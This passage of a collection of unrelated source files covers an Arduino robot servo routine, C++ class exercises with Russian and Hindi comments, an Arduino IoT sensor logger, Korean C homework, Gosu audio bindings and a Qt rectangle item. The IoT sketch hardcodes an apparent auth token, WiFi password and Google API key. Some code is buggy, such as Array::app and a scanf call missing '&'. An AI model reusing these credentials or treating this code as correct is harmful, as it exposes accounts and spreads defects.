325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325}; /* RH1,RH2,RL1,RL2,LH1,LH2,LL1,LL2,HEAD,DMY1,DMY2,DMY3,DMY4,DMY5,DMY6 */\r\n  for (int i = 0; i < 16; i++) {\r\n    servo_position[i] = pwm_array[i];\r\n  }\r\n  move_servo(1000, pwm_array);\r\n}\r\n/* Moving each servo at given time interval */\r\nvoid MiniHashHumanoid::move_servo(int time, int  servo_target[]) {\r\n\r\n  if (time > 10) {\r\n    for (int i = 0; i < 16; i++) {\r\n      increment[i] = ((servo_target[i]) - servo_position[i]) / (time / 10.0);\r\n    }\r\n    final_time =  millis() + time;\r\n\r\n    for (int iteration = 1; millis() < final_time; iteration++) {\r\n      partial_time = millis() + 10;\r\n\r\n      for (int i = 0; i < 16; i++) {\r\n        set_servo(i, (int)(servo_position[i] + (iteration * increment[i])));\r\n\r\n      }\r\n      while (millis() < partial_time);\r\n\r\n      DacAudio.FillBuffer();\r\n      //Serial.println(\"hehe\");\r\n    }\r\n  }\r\n  else {\r\n    for (int i = 0; i < 16; i++) {\r\n      set_servo(i, (int)servo_target[i]);\r\n    }\r\n  }\r\n  for (int i = 0; i < 16; i++) {\r\n    servo_position[i] = servo_target[i];\r\n  }\r\n}\r\n\r\n/******************************************************************************************************/\r\nvoid MiniHashHumanoid::initial_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, initialface, 128, 64, 1);\r\n  display.display();\r\n}\r\nvoid MiniHashHumanoid::bink_eye(int bink_count) {\r\n\r\n  for (int i = 1 ; i <= bink_count; i++) {\r\n    display.clearDisplay();\r\n    display.drawBitmap(0, 0, blinkeye, 128, 64, 1);\r\n    display.display();\r\n    delay(500);\r\n    initial_face();\r\n    delay(1000);\r\n  }\r\n}\r\nvoid MiniHashHumanoid::talking_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, talkface, 128, 64, 1);\r\n  display.display();\r\n}\r\nvoid MiniHashHumanoid::happy_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, happyface, 128, 64, 1);\r\n  display.display();\r\n}\r\nvoid MiniHashHumanoid::angry_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, angryface, 128, 64, 1);\r\n  display.display();\r\n}\r\n\r\nvoid MiniHashHumanoid::sad_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, sadface, 128, 64, 1);\r\n  display.display();\r\n}\r\nvoid MiniHashHumanoid::crying_face() {\r\n  display.clearDisplay();\r\n  display.drawBitmap(0, 0, cryingface, 128, 64, 1);\r\n  display.display();\r\n}\r\n\r\n/******************************************************************************************************/\r\nvoid MiniHashHumanoid::say_hi(int count) {\r\n  XT_Wav_Class PlayVoice(hellohumanoids);\r\n  PlayVoice.RepeatForever = false;\r\n  DacAudio.Play(&PlayVoice);\r\n  talking_face();\r\n\r\n  int pwm_array1[16] = {500, 250, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n  move_servo(1500, pwm_array1);\r\n\r\n  for (int i = 1; i <= count; i++) {\r\n    int pwm_array2[16] = {500, 175, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n    int pwm_array3[16] = {500, 250, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n    move_servo(1000, pwm_array2);\r\n    move_servo(1000, pwm_array3);\r\n  }\r\n  int pwm_array4[16] = {100, 100, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n  move_servo(1500, pwm_array4);\r\n  initial_face();\r\n}\r\n\r\n/******************************************************************************************************/\r\nvoid MiniHashHumanoid::my_name_hash_jr() {\r\n\r\n  XT_Wav_Class PlayVoice(mynamehashjr);\r\n  PlayVoice.RepeatForever = false;\r\n  DacAudio.Play(&PlayVoice);\r\n  talking_face();\r\n\r\n  int pwm_array1[16] = {300, 175, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n  int pwm_array2[16] = {300, 100, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n  int pwm_array3[16] = {300, 175, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325};\r\n  int pwm_array4[16] = {100, 100, 325, 325, 550, 550, 325, 325, 325, 325, 325, 325, 325, 325, 325, 325",
    "\ufeff#include <iostream>\n\nclass Point {\npublic:\n\tdouble x;\n\tdouble y;\n\tPoint() : Point(.0, .0) {}\n\tPoint(double x, double y) :x(x), y(y) {}\n\tPoint(const Point& oP) : Point(oP.x, oP.y) {}\n\tvoid print() const {\n\t\tstd::cout << '(' << x << \"; \" << y << \")\\n\";\n\t}\n\n\tdouble distanceTo(const Point oP) const {\n\t\treturn sqrt(\n\t\t\tpow(oP.x - x, 2) +\n\t\t\tpow(oP.y - y, 2)\n\t\t);\n\t}\n\n\tPoint operator+(double num) const {\n\t\treturn Point(x + num, y + num);\n\t}\n\n\tPoint operator+(const Point oP) const {\n\t\treturn Point(x + oP.x, y + oP.y);\n\t}\n\n\tPoint& operator++()  {\n\t\t++x; ++y;\n\t\treturn *this;\n\t}\n\t\n\tPoint operator++(int) {\n\t\tPoint tmp = *this;\n\t\t++x; ++y;\n\t\treturn tmp;\n\t}\n\n\tbool operator==(const Point oP) {\n\t\treturn x == oP.x && y == oP.y;\n\t}\n\tbool operator!=(const Point oP) {\n\t\treturn x != oP.x || y != oP.y;\n\t\t//return !(*this == oP); \u0425\u043e\u0440\u043e\u0448\u0438\u0439 \u0432\u0430\u0440\u0438\u0430\u043d\u0442.\n\t}\n\tbool operator>(const Point oP) {\n\t\treturn distanceTo(Point(0., 0.)) > oP.distanceTo(Point(0., 0.));\n\t}\n\n\tbool operator<(const Point oP) {\n\t\treturn distanceTo(Point(0., 0.)) < oP.distanceTo(Point(0., 0.));\n\t}\n};\n\nclass Array {\nprivate:\n\tint* pointer;\n\tsize_t length;\npublic:\n\tArray() : pointer(nullptr), length(0){}\n\tArray(size_t length) {\n\t\tif (length == 0) {\n\t\t\tthis->pointer = nullptr;\n\t\t\tthis->length = 0;\n\t\t\treturn;\n\t\t}\n\t\tthis->pointer = new int[length]{};\n\t\tthis->length = length;\n\t}\n\tArray(const Array& other) {\n\t\tlength = other.length;\n\t\tif (other.pointer == nullptr) {\n\t\t\tpointer = nullptr;\n\t\t\treturn;\n\t\t }\n\t\tpointer = new int[length];\n\t\tfor (size_t i = 0; i < length; ++i)\n\t\t\tpointer[i] = other[i];\n\t\t\n\t}\n\t~Array() {\n\t\tdelete[] pointer;\n\t}\n\n\tvoid app(int num) {\n\t\tif (pointer == nullptr) {\n\t\t\tpointer = new int[1] {num};\n\t\t\tlength = 1;\n\t\t\treturn;\n\t\t}\n\t\t\n\t\t\tint* tmp = new int[length + 1];\n\t\t\tfor (size_t i = 0; i < length ; ++i) {\n\t\t\t\ttmp[i] = pointer[i];\n\t\t\ttmp[length] = num;\n\t\t\t\n\t\t\tdelete[] pointer;\n\t\t\tpointer = tmp;\n\t\t\t++length;\n\t\t}\n\t}\n\tsize_t size() const { return length; }\n\n\tint& operator[](size_t index)  {\n\t\t//if (index >= length)\n\t\t\t//throw \"Error\";\n\t\treturn pointer[index];\n\t}\n\tint operator[](size_t index) const {\n\t\treturn pointer[index];\n\t}\n\tvoid operator=(const Array& other) {\n\t\tdelete[] pointer;\n\t\tlength = other.length;\n\t\tif (other.pointer == nullptr) {\n\t\t\tpointer = nullptr;\n\t\t\treturn;\n\t\t}\n\t\tpointer = new int[length];\n\t\tfor (size_t i = 0; i < length; ++i)\n\t\t\tpointer[i] = other[i];\n\t}\n};\n\n\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\n\t// \u041f\u0435\u0440\u0435\u0433\u0440\u0443\u0437\u043a\u0430 \u0431\u0430\u0437\u043e\u0432\u044b\u0445 \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u043e\u0432\n\t/*Point p1(4, 5), p2(8, 10);\n\tp1.print();\n\tp2.print();\n\t(p1 + 1).print();\n\t(p1 + p2).print();\n\tPoint p3(2, 1);\n\t(++p3).print();\n\t(p3++).print();\n\tp3.print();\n\n\tif (p1 > p2)\n\t\tstd::cout << \"\u041f\u0435\u0440\u0432\u0430\u044f \u0442\u043e\u0447\u043a\u0430 \u0434\u0430\u043b\u044c\u0448\u0435!\\n\";\n\telse\n\t\tstd::cout << \"\u041f\u0435\u0440\u0432\u0430\u044f \u0442\u043e\u0447\u043a\u0430 \u043d\u0435 \u0434\u0430\u043b\u044c\u0448\u0435!\\n\";*/\n\n\n\tArray arr1(3);\n\tArray arr2;\n\tfor (size_t i = 0; i < arr1.size(); ++i)\n\t\tarr1[i] = (i + 1) * 10;\n\t\n\tstd::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 1:\\n\";\n\tfor (size_t i = 0; i < arr1.size(); ++i)\n\t\tstd::cout << arr1[i] << ' ';\n\tstd::cout << std::endl;\n\n\tArray arr3 = arr1;\n\tstd::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 3:\\n\";\n\tfor (size_t i = 0; i < arr3.size(); ++i)\n\t\tstd::cout << arr3[i] << ' ';\n\tstd::cout << std::endl;\n\n\tarr3[1] = 100;\n\tstd::cout << \"--------------------------\\n\";\n\n\tstd::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 1:\\n\";\n\tfor (size_t i = 0; i < arr1.size(); ++i)\n\t\tstd::cout << arr1[i] << ' ';\n\tstd::cout << std::endl;\n\n\t\n\tstd::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 3:\\n\";\n\tfor (size_t i = 0; i < arr3.size(); ++i)\n\t\tstd::cout << arr3[i] << ' ';\n\tstd::cout << std::endl;\n\n\tstd::cout << \"--------------------------\\n\";\n\tarr2 = arr1;\n\tarr1[1] = 100;\n\n\tstd::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 2:\\n\";\n\tfor (size_t i = 0; i < arr2.size(); ++i)\n\t\tstd::cout << arr2[i] << ' ';\n\tstd::cout << std::endl;\n\n\treturn  0;\n}",
    "#include <Arduino.h>\n#include <ModbusMaster.h>\n#include <WiFiNINA.h>\n#include <SPI.h>\n#include <SD.h>\n\n#include <PubSubClient.h>\n\n#include <ArduinoHttpClient.h>\n#include <ArduinoJson.h>\n\n#include <RTCZero.h>\n#include <avr/dtostrf.h>\n#include <iomanip>\n\n/* Create an rtc object */\nRTCZero rtc;\n\n/* Change these values to set the current initial time */\nconst byte seconds = 0;\nconst byte minutes = 0;\nconst byte hours = 11;\n\n/* Change these values to set the current initial date */\nconst byte day = 23;\nconst byte month = 3;\nconst byte year = 24;\n\nchar auth[] = \"vK2z96dcRVNRZojcHeYw8YQSy_D55mqT\";\n\nchar ssid[] = \"DeterminedGuy\";\nchar pass[] = \"athalganteng\";\nconst char* googleApiKey = \"AIzaSyCm6P9KfhQK5PwbwYXka83_k3OXVuCiLxU\";\nconst char blynk_server [] = \"blynk.cloud\"; \nconst int blynk_port = 8080;  \nconst char* mqtt_server = \"34.123.176.43\";\n\nconst char* sensor_id = \"sensor1\";\n\n// MicroSD\n#define FILE_BASE_NAME \"Data\"\nFile my_file;\nconst uint8_t BASE_NAME_SIZE = sizeof(FILE_BASE_NAME) - 1;\nchar file_name[] = FILE_BASE_NAME \"00.csv\";\n#define pin_cs 4\nint writeSDCardState = 0;\n\nvoid setupSDcard(){\n  // inisialisasi rekam data\n  pinMode(pin_cs, OUTPUT);\n  while (!Serial) {\n    ; // wait for serial port to connect. Needed for native USB port only\n  }\n  Serial.print(\"Initializing SD card...\");\n\n  // see if the card is present and can be initialized:\n  if (!SD.begin(pin_cs)) {\n    Serial.println(\"Card failed, or not present\");\n    while (1);\n  }\n  Serial.println(\"card initialized.\");\n\n  while (SD.exists(file_name)) {\n    if (file_name[BASE_NAME_SIZE + 1] != '9') {\n      file_name[BASE_NAME_SIZE + 1]++;\n    } else if (file_name[BASE_NAME_SIZE] != '9') {\n      file_name[BASE_NAME_SIZE + 1] = '0';\n      file_name[BASE_NAME_SIZE]++;\n    } else {\n      Serial.println(F(\"Can't create file name\"));\n      return;\n    }\n  }\n}\n\n// Blynk\nvoid WifiConnect(){\n  Serial.println(F(\"Connecting to Wi-Fi\"));\n  \n  if(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, pass); \n  }\n  \n  while(WiFi.status() != WL_CONNECTED){\n    delay(1000);\n    Serial.print(\".\");\n  }\n  \n  if(WiFi.status() == WL_CONNECTED){\n    Serial.println(F(\"Wi-Fi CONNECTED\"));\n  }\n}\n\nvoid setupRTC(){\n  rtc.begin(); // initialize RTC\n\n  //Set the time\n  rtc.setHours(hours);\n  rtc.setMinutes(minutes);\n  rtc.setSeconds(seconds);\n\n  // Set the date\n  rtc.setDay(day);\n  rtc.setMonth(month);\n  rtc.setYear(year);\n}\n\nvoid getTimeStamp(){\n    // Print date...\n  Serial.print(rtc.getDay());\n  Serial.print(\"/\");\n  Serial.print(rtc.getMonth());\n  Serial.print(\"/\");\n  Serial.print(rtc.getYear());\n  Serial.print(\"\\t\");\n\n  // ...and time\n  Serial.print(rtc.getHours());\n  Serial.print(\":\");\n  Serial.print(rtc.getMinutes());\n  Serial.print(\":\");\n  Serial.print(rtc.getSeconds());\n\n  Serial.println();\n\n  delay(1000);\n}\n\n// Modbus\nModbusMaster node1, node2;\n\n#define MAX485_DE      3  //control pin first MAX485  \n#define MAX485_RE_NEG  2  //control pin first MAX485 \n\nint16_t rika1[2], rika2[2];\nfloat temperature1, humidity1, temperature2, humidity2;\nint readModbusRS485State = 0;\n\nvoid preTransmission(){\n  digitalWrite(MAX485_RE_NEG, 1);\n  digitalWrite(MAX485_DE, 1);\n}\n\nvoid postTransmission(){\n  digitalWrite(MAX485_RE_NEG, 0);\n  digitalWrite(MAX485_DE, 0);\n}\n\nvoid setupModbusRS485(){\n  \n  pinMode(MAX485_RE_NEG, OUTPUT);\n  pinMode(MAX485_DE, OUTPUT);\n\n  // Init in receive mode\n  digitalWrite(MAX485_RE_NEG, 0);\n  digitalWrite(MAX485_DE, 0);\n\n  // delay(10);\n\n  //baudrate for master arduino - slave sensor\n  Serial1.begin(9600);\n\n  // Sensor Modbus slave ID is 1\n  node1.begin(1, Serial1);\n  node2.begin(2, Serial1);\n\n  // Callbacks allow us to configure the RS485 transceiver correctly\n  node1.preTransmission(preTransmission);\n  node1.postTransmission(postTransmission);\n\n  node2.preTransmission(preTransmission);\n  node2.postTransmission(postTransmission);\n}\n\n// Battery \nint batteryPin = A1;\nint batteryMeasureState = 0;\nfloat batteryPercentage; \n\nvoid batteryMeasure(){\n  long sum = 0;                   \n  float voltage = 0.0;            \n  float output = 0.0;             \n  const float batteryMaxVoltage = 4.1;\n  const float batteryMinVoltage = 3.3;\n\n  if (batteryMeasureState == 0){\n    for (int i = 0; i < 500; i++){\n      sum += analogRead(batteryPin);\n      delayMicroseconds(1000);\n    }\n    \n    voltage = sum / (float) 500;\n    voltage = (voltage * 4.39) / 1023.0; \n    voltage = roundf(voltage * 100) / 100;\n    output = ((voltage - batteryMinVoltage) / (batteryMaxVoltage - batteryMinVoltage)) * 100;\n\n    if (output <= 0.00){\n      batteryPercentage = 0.00;\n    } else if (output > 100.00){\n      batteryPercentage = 100.00;\n    } else {\n      batteryPercentage = output;\n    }\n  }\n  Serial.print(\"Battery Percentage: \");\n  Serial.println(output);\n  batteryMeasureState = 1;\n}\n\nint32_t keller[4];\nchar pressure1[5], pressure2[5], tob1[5], tob2[5];\nfloat final_pressure, final_temperature;\n\nvoid readModbusRS485(){\n  uint8_t result, result2;\n  \n  if (readModbusRS485State == 0){\n    result = node1.readHol",
    "#include <stdio.h>\n//\uacfc\uc81c 1\ubc88 \n/*int main(void) {\n\tfloat num1, num2, num3, num4, num5;\n\tprintf(\"1\ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624 :  \");\n\tscanf_s(\"%f\", &num1);\n\n\tprintf(\"2\ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624 :  \");\n\tscanf_s(\"%f\", &num2);\n\n\tprintf(\"3\ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624 :  \");\n\tscanf_s(\"%f\", &num3);\n\n\tprintf(\"4\ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624 :  \");\n\tscanf_s(\"%f\", &num4);\n\n\tprintf(\"5\ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624 :  \");\n\tscanf_s(\"%f\", &num5);\n\tprintf(\"---- \uacb0\uacfc ----\\n\");\n\t// \uc2e4\uc218 5\uac1c \ubc1b\uae30 \ud504\ub85c\uadf8\ub7a8 \n\tfloat ave;//\ud3c9\uade0\uc744 \uad6c\ud558\ub294 \ud504\ub85c\uadf8\ub7a8 \n\tfloat sum;\n\tsum = num1 + num2 + num3 + num4 + num5;\n\tave = sum / 5;\n\tprintf(\"\ud3c9\uade0\uc740 %.6f \uc785\ub2c8\ub2e4 \\n\", ave);\n\n\tfloat max = num1;// \ucd5c\ub300\uac12\uc744 \uad6c\ud558\ub294 \ud504\ub85c\uadf8\ub7a8 \n\tif (num2 > max)\n\t\tmax = num2;\n\tif (num3 > max)\n\t\tmax = num3;\n\tif (num4 > max)\n\t\tmax = num4;\n\tif (num5 > max)\n\t\tmax = num5;\n\n\tprintf(\"\ucd5c\ub300\uac12\uc740 %.6f \uc785\ub2c8\ub2e4 \\n\", max);\n\n\n\tfloat min= num1;// \ucd5c\uc18c\uac12\uc744 \uad6c\ud558\ub294 \ud504\ub85c\uadf8\ub7a8 \n\tif (min>num2)\n\t\tmin = num2;\n\n\tif (min > num3)\n\t\tmin = num3;\n\n\tif (min > num4)\n\t\tmin = num4;\n\n\tif (min > num5)\n\t\tmin = num5;\n\t\n\t\n\tprintf(\"\ucd5c\uc18c\uac12\uc740 %.6f \uc785\ub2c8\ub2e4 \\n\", min);\n}*/\n\n// \uacfc\uc81c 2\ubc88 \n/*int main(void) {\n\tint a;\n\tint f1 = 0, f2 = 1, f3;\nprintf(\"\ud53c\ubcf4\ub098\uce58 \uc218\uc5f4\uc758 n\ubc88\uc9f8\ub97c \uc785\ub825\ud558\uc2dc\uc624 : \");\nscanf_s(\"%d\", &a);\nfor (int i = 0; i < a; i++) {\n\tif (i == 0) {\n\t\tprintf(\"%d \", f1);\n\t}\n\telse if (i == 1) {\n\t\tprintf(\"%d \", f2);\n\t\t\n\t}\n\telse {// 3\ubc88\uc9f8 \uc774\ud6c4\ub85c\uc758 \ud53c\ubcf4\ub098\uce58 \uc218\uc5f4 \n\t\tf3 = f1 + f2;\n\t\tprintf(\"%d \", f3);\n\t\tf1 = f2;\n\t\tf2 = f3;\n\t}\n}\n\t\n}*/\n\n// \uacfc\uc81c 3\ubc88 \nint main(void) {\n\tint year;\n\tprintf(\"\ub144\ub3c4\ub97c \uc785\ub825\ud558\uc138\uc694 : \");\n\tscanf(\"%d\", year);\n}\n\n\n//\uacfc\uc81c 4\ubc88 \n/*int main(void) {\n\tfloat num1, num2;\n\tchar ch;\n\tprintf(\"input:\");\n\tscanf(\"%f %c %f\", &num1, &ch, &num2);// \uc2e4\uc218 2\uac1c\uc5d0 \uc5f0\uc0b0\uc790 1\uac1c\ub97c \uba3c\uc800 \ubc1b\ub294\ub2e4 \n\tfloat  mul = 1;\n\tif (ch == '^') {\n\t\tfor (int i = 0; i < num2; i++) {\n\t\t\tmul = mul * num1;\n\t\t}printf(\"%.2f^%.2f=%.2f\\n\", num1, num2, mul);// \uac70\ub4ed\uc81c\uacf1\uc744 \uacc4\uc0b0 \ud558\uae30 \uc704\ud574 for \ubb38\uc744 \uc774\uc6a9\ud55c\ub2e4 \n\n\t}\n\t\n\telse {\n\t\tswitch (ch) {\n\t\tcase '+':\n\t\t\tprintf(\"%.2f+%.2f=%.2f\\n\", num1, num2, num1 + num2);\n\t\t\tbreak;\n\n\t\tcase '-':\n\t\t\tprintf(\"%.2f-%.2f=%.2f\\n\", num1, num2, num1 - num2);\n\t\t\tbreak;\n\n\t\tcase '*':\n\t\t\tprintf(\"%.2f*%.2f=%.2f\\n\", num1, num2, num1 * num2);\n\t\t\tbreak;\n\n\t\tcase '/':\n\t\t\tif (num2 != 0) {\n\t\t\t\tprintf(\"%.2f/%.2f=%.2f\\n\", num1, num2, num1 / num2);\n\t\t\t}\n\t\t\telse\n\t\t\t\tprintf(\"0\uc774 \uc544\ub2cc \uc22b\uc790\ub85c \uc785\ub825\ud574 \uc8fc\uc138\uc694 \\n\");\n\t\t}// \uac70\ub4ed\uc81c\uacf1\uc774 \uc544\ub2cc \ub098\uba38\uc9c0 \uc5f0\uc0b0\uc790\ub294 \uc0ac\uce59\uc5f0\uc0b0\uc73c\ub85c \ubc1b\ub294\ub2e4 \n\n\t}// switch\ubb38\uc744 \uc0ac\uc6a9\ud558\uc5ec \uacbd\uc6b0\uc5d0 \ub530\ub77c \uacb0\uacfc\uac12\uc774 \ub2e4\ub974\uac8c \ub098\uc624\ub3c4\ub85d \ub9cc\ub4e4\uba74 \ub05d\uc774\ub2e4 \n}*/",
    "#include \"Gosu_FFI_internal.h\"\n\nGOSU_FFI_API void Gosu_Channel_destroy(Gosu_Channel* channel)\n{\n    delete channel;\n}\n\nGOSU_FFI_API bool Gosu_Channel_playing(Gosu_Channel* channel)\n{\n    return Gosu_translate_exceptions([=] {\n        return channel->channel.playing();\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_pause(Gosu_Channel* channel)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.pause();\n    });\n}\n\nGOSU_FFI_API bool Gosu_Channel_paused(Gosu_Channel* channel)\n{\n    return Gosu_translate_exceptions([=] {\n        return channel->channel.paused();\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_resume(Gosu_Channel* channel)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.resume();\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_stop(Gosu_Channel* channel)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.stop();\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_set_volume(Gosu_Channel* channel, double volume)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.set_volume(volume);\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_set_speed(Gosu_Channel* channel, double speed)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.set_speed(speed);\n    });\n}\n\nGOSU_FFI_API void Gosu_Channel_set_pan(Gosu_Channel* channel, double pan)\n{\n    Gosu_translate_exceptions([=] {\n        channel->channel.set_pan(pan);\n    });\n}\n",
    "//         ***multilevel inheritance***\n\n\n\n#include <iostream>\nusing namespace std;\n\nclass Student\n{\nprotected:\n    int roll_number;\n\npublic:\n    void set_roll_number(int); //lene bala 90% time ku6 leta hai\n    void get_roll_number(void);//dene  bala 90% time  ku6 nehi leta mean void hota hai\n};\n\nvoid Student ::set_roll_number(int r)\n{\n    roll_number = r;\n}\n\nvoid Student ::get_roll_number()\n{\n    cout << \"The roll number is \" << roll_number << endl;\n}\n\n/*  **********************1st derivative class********************** */\nclass Exam : public Student\n{\nprotected:\n    float maths;\n    float physics;\n\npublic:\n    void set_marks(float, float);\n    void get_marks(void);\n};\n\nvoid Exam ::set_marks(float m1, float m2)\n{\n    maths = m1;\n    physics = m2;\n}\n\nvoid Exam ::get_marks()\n{\n    cout << \"The marks obtained in maths are: \" << maths << endl;\n    cout << \"The marks obtained in physics are: \" << physics << endl;\n}\n  /* **********************2nd derivative class************************ */\nclass Result : public Exam\n{\n    float percentage;\n\npublic:\n    void display_results()\n    {\n        get_roll_number();\n        get_marks();\n        cout << \"Your result is \" << (maths + physics) / 2 << \"%\" << endl;\n    }\n};\nint main()\n{\n    Result harry;\n    harry.set_roll_number(420);\n    harry.set_marks(94.0, 90.0);\n    harry.display_results();\n    return 0;\n}\n",
    "#include \"CustomRectangleItem.h\" // \u5305\u542b\u81ea\u5b9a\u4e49\u77e9\u5f62\u9879\u5934\u6587\u4ef6\n\n// CustomRectangleItem\u6784\u9020\u51fd\u6570\uff0c\u63a5\u53d7\u4e00\u4e2aQRectF\u5bf9\u8c61\u548c\u4e00\u4e2a\u7236\u56fe\u5f62\u9879\nCustomRectangleItem::CustomRectangleItem(const QRectF &rect, QGraphicsItem *parent)\n    : QGraphicsRectItem(rect, parent), // \u8c03\u7528\u57fa\u7c7bQGraphicsRectItem\u7684\u6784\u9020\u51fd\u6570\n    isDraggingTopLeftHandle(false), // \u521d\u59cb\u5316\u5de6\u4e0a\u89d2\u53e5\u67c4\u62d6\u52a8\u72b6\u6001\u4e3afalse\n    isDraggingBottomRightHandle(false), // \u521d\u59cb\u5316\u53f3\u4e0b\u89d2\u53e5\u67c4\u62d6\u52a8\u72b6\u6001\u4e3afalse\n    isDraggingRect(false)\n{\n    setFlag(QGraphicsItem::ItemIsMovable, true); // \u8bbe\u7f6e\u77e9\u5f62\u9879\u53ef\u4ee5\u79fb\u52a8\n    setFlag(QGraphicsItem::ItemIsSelectable, true); // \u8bbe\u7f6e\u77e9\u5f62\u9879\u53ef\u4ee5\u88ab\u9009\u62e9\n\n    QPen pen(Qt::black); // \u521b\u5efa\u4e00\u4e2a\u9ed1\u8272\u753b\u7b14\n    pen.setWidth(2); // \u8bbe\u7f6e\u753b\u7b14\u5bbd\u5ea6\u4e3a2\u50cf\u7d20\n    setPen(pen); // \u5e94\u7528\u753b\u7b14\u5230\u77e9\u5f62\u9879\n\n    this->LT=mapToScene(this->rect().topLeft());\n    this->RB=mapToScene(this->rect().bottomRight());\n\n    topLeftHandle = new QGraphicsEllipseItem(-3, -3, 6, 6, this); // \u521b\u5efa\u5de6\u4e0a\u89d2\u53e5\u67c4\n    topLeftHandle->setBrush(Qt::green); // \u8bbe\u7f6e\u53e5\u67c4\u586b\u5145\u989c\u8272\u4e3a\u7eff\u8272\n    topLeftHandle->setFlag(QGraphicsItem::ItemIsMovable, false); // \u8bbe\u7f6e\u53e5\u67c4\u4e0d\u53ef\u79fb\u52a8\n    topLeftHandle->setFlag(QGraphicsItem::ItemIsSelectable, false); // \u8bbe\u7f6e\u53e5\u67c4\u4e0d\u53ef\u9009\u62e9\n\n    bottomRightHandle = new QGraphicsEllipseItem(-3, -3, 6, 6, this); // \u521b\u5efa\u53f3\u4e0b\u89d2\u53e5\u67c4\n    bottomRightHandle->setBrush(Qt::green); // \u8bbe\u7f6e\u53e5\u67c4\u586b\u5145\u989c\u8272\u4e3a\u7eff\u8272\n    bottomRightHandle->setFlag(QGraphicsItem::ItemIsMovable, false); // \u8bbe\u7f6e\u53e5\u67c4\u4e0d\u53ef\u79fb\u52a8\n    bottomRightHandle->setFlag(QGraphicsItem::ItemIsSelectable, false); // \u8bbe\u7f6e\u53e5\u67c4\u4e0d\u53ef\u9009\u62e9\n\n    updateHandlesPosition(); // \u66f4\u65b0\u53e5\u67c4\u4f4d\u7f6e\n}\n\n// \u66f4\u65b0\u53e5\u67c4\u4f4d\u7f6e\u7684\u51fd\u6570\nvoid CustomRectangleItem::updateHandlesPosition() {\n    QRectF rect = this->rect(); // \u83b7\u53d6\u77e9\u5f62\u9879\u7684\u77e9\u5f62\n    topLeftHandle->setPos(rect.topLeft()); // \u8bbe\u7f6e\u5de6\u4e0a\u89d2\u53e5\u67c4\u7684\u4f4d\u7f6e\n    bottomRightHandle->setPos(rect.bottomRight()); // \u8bbe\u7f6e\u53f3\u4e0b\u89d2\u53e5\u67c4\u7684\u4f4d\u7f6e\n}\n\n// \u9f20\u6807\u6309\u4e0b\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\nvoid CustomRectangleItem::mousePressEvent(QGraphicsSceneMouseEvent *event) {\n    qDebug()<<QLineF(LT, event->scenePos()).length()<<\"len\"<<Qt::endl;\n    // \u5982\u679c\u9f20\u6807\u4f4d\u7f6e\u63a5\u8fd1\u5de6\u4e0a\u89d2\u53e5\u67c4\uff0c\u8bbe\u7f6e\u62d6\u52a8\u72b6\u6001\u4e3a\u62d6\u52a8\u5de6\u4e0a\u89d2\u53e5\u67c4\n    if (QLineF(LT, event->scenePos()).length() < 7) {\n        isDraggingTopLeftHandle = true;\n    }\n    else if (QLineF(RB, event->scenePos()).length() < 7) { // \u5982\u679c\u9f20\u6807\u4f4d\u7f6e\u63a5\u8fd1\u53f3\u4e0b\u89d2\u53e5\u67c4\uff0c\u8bbe\u7f6e\u62d6\u52a8\u72b6\u6001\u4e3a\u62d6\u52a8\u53f3\u4e0b\u89d2\u53e5\u67c4\n        isDraggingBottomRightHandle = true;\n    }\n    else if(isSelected())\n    {\n        isDraggingRect=true;\n    }\n\n    QGraphicsRectItem::mousePressEvent(event); // \u8c03\u7528\u57fa\u7c7b\u7684\u9f20\u6807\u6309\u4e0b\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\n}\n\n// \u9f20\u6807\u79fb\u52a8\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\nvoid CustomRectangleItem::mouseMoveEvent(QGraphicsSceneMouseEvent *event) {\n    if (isDraggingTopLeftHandle)\n    { // \u5982\u679c\u6b63\u5728\u62d6\u52a8\u5de6\u4e0a\u89d2\u53e5\u67c4\uff0c\u66f4\u65b0\u77e9\u5f62\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\n        QPointF tempLT=event->scenePos();\n        if(tempLT.x()<RB.x()-10&&tempLT.y()<RB.y()-10)\n        {\n            LT=event->scenePos();\n            QRectF 